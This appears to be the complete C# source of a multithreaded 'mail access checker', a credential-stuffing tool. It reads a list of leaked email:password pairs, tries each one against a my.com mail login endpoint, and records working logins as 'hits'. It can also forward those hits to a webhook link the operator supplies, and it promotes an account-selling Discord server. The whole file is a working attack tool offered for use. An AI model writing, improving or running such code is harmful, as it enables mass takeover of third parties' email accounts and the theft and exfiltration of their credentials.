﻿using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using Console = Colorful.Console;
using System.Drawing;
using System.Threading;
using System.IO;
using System.Windows.Forms;
using Leaf.xNet;

namespace MailAccess_Checker
{
    internal class Program
    {
        public static int totalChecked, cpm, hits, bads, errors, threads, comboIndex;
        public static string webhooklink;
        public static List<string> combos = new List<string>();
        public static int Combototal;
        public static bool webhook;

        public static void Main(string[] args)
        {
            #region startup
            Utils.print("Select Combo", "");
            ComboLoad();


            Utils.print("How many threads do you want to use", "\n");
            Utils.print(">", "");
            bool validInput = false;
            while (!validInput)
            {
                try
                {
                    threads = Convert.ToInt32(System.Console.ReadLine());
                    validInput = true;
                }
                catch
                {
                    Utils.print("Error! Input a number", "");
                    Console.Write("    [", Color.White);
                    Console.Write("Error! Input a number", Color.Red);
                    Console.Write("]\n", Color.White);
                }
            }

            Utils.print("Do you want to use webhook? (Y/N | default: No)", "\n");
            Utils.print(">", "");
            var webhookquestion = System.Console.ReadLine();
            switch (webhookquestion)
            {
                case "Y":
                    Utils.print("Webhook link:", "\n");
                    Utils.print(">", "");
                    webhook = true;
                    webhooklink = System.Console.ReadLine();
                    break;
                case "N":
                    webhook = false;
                    break;
                default:
                    webhook = false;
                    break;
            }

            #endregion
            #region start

            Utils.Initialize();
            var num = 0;
            while (num <= threads)
            {
                new Thread(new ThreadStart(check)).Start();
                num = num + 1;
            }

            Task.Factory.StartNew(delegate { UpdateConsole(); });
            Console.ReadLine();
            #endregion
        }
        public static void UpdateConsole()
        {
            var lastChecks = totalChecked;
            for (; ; )
            {
                cpm = totalChecked - lastChecks;
                lastChecks = totalChecked;
                Console.Clear();
                Console.WriteLine("");
                Console.WriteLine("");
                Console.WriteLine("");
                Console.Write("    [", Color.White);
                Console.Write("HITS", Color.LimeGreen);
                Console.Write($"] {hits}\n", Color.White);
                Console.Write("    [", Color.White);
                Console.Write("BADS", Color.Red);
                Console.Write($"] {bads}\n", Color.White);
                Console.Write("    [", Color.White);
                Console.Write("ERRORS", Color.DarkOrange);
                Console.Write($"] {Program.errors}\n", Color.White);
                Console.Write("    [", Color.White);
                Console.Write("TOTAL", Color.Aquamarine);
                Console.Write($"] {totalChecked}\n", Color.White);
                Console.Write("    [", Color.White);
                Console.Write("CPM", Color.RoyalBlue);
                Console.Write($"] {Program.cpm * 60}\n\n", Color.White);
                Console.Write("    [", Color.White);
                Console.Write("INFO", Color.Green);
                Console.Write("] discord.gg/DiogoAlts \n", Color.White);

                Console.Title = "DiogoBase - Hits: " + hits + " | Bads: " + bads + " | Errors: " + errors + " CPM: " + cpm;

                Thread.Sleep(1000);
            }
        }

        public static void check()
        {
            while (Thread.CurrentThread.IsAlive)
            {
                using (var req = new HttpRequest())
                {
                    try
                    {
                        var array = combos[comboIndex].Split(':', ';', '|');
                        Interlocked.Increment(ref comboIndex);
                        totalChecked++;

                        req.UserAgent = Http.ChromeUserAgent();
                        req.IgnoreProtocolErrors = true;
                        req.AllowAutoRedirect = true;
                        req.KeepAlive = true;

                        string request = req.Post("https://aj-https.my.com/cgi-bin/auth?ajax_call=1&mmp=mail&simple=1&Login=" + array[0] + "&Password=" + array[1]).ToString();

                        if (request.Contains("Ok=1"))
                        {
                            // Hit
                            hits++;
                            Utils.AsResult("/MailAcess", array[0] + ":" + array[1]);
                            if (webhook)
                                Utils.sendTowebhook(array[0] + ":" + array[1], "MailAcess");
                        }
                        else
                            bads++;

                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine(ex.ToString());
                        errors++;
                    }
                }
            }
        }

        public static void ComboLoad()
        {
            string fileName;
            var x = new Thread(() =>
            {
                var openFileDialog = new OpenFileDialog();
                do
                {
                    openFileDialog.Title = "Select Combo List";
                    openFileDialog.DefaultExt = "txt";
                    openFileDialog.Filter = "Text files|*.txt";
                    openFileDialog.RestoreDirectory = true;
                    openFileDialog.ShowDialog();
                    fileName = openFileDialog.FileName;
                } while (!File.Exists(fileName));

                combos = new List<string>(File.ReadAllLines(fileName));
                Combototal = combos.Count();
                Console.Write("Selected ", Color.White);
                Console.Write(Combototal, Color.Purple);
                Console.Write(" Combos\n\n", Color.White);
            });
            x.SetApartmentState(ApartmentState.STA);
            x.Start();
            x.Join();
        }
    }
}